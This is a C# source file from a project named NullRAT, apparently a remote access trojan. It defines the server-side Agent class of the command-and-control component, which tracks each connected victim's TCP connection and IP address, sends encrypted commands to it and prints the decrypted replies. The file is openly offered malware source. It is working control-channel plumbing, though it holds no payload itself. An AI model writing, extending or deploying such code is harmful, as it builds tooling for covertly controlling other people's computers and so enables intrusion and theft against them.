using NullRAT.Config;
using NullRAT.Utils;
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace NullRAT.Server.Core
{
    public class Agent
    {
        public TcpClient Client { get; }
        public string IP { get; }
        public bool IsConnected => Client.Connected;

        public Agent(TcpClient client)
        {
            Client = client;
            IP = ((System.Net.IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
        }

        public async Task SendCommand(string command)
        {
            try
            {
                var stream = Client.GetStream();
                byte[] data = Crypto.Encrypt(Encoding.UTF8.GetBytes(command));
                await stream.WriteAsync(data, 0, data.Length);

                byte[] buffer = new byte[65535];
                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);

                string response = Encoding.UTF8.GetString(Crypto.Decrypt(buffer, bytes));
                Console.WriteLine(response);
            }
            catch
            {
                ConsoleUI.Log("Agent disconnected.", ConsoleColor.Red);
            }
        }

        public void Disconnect()
        {
            Client.Close();
        }
    }
}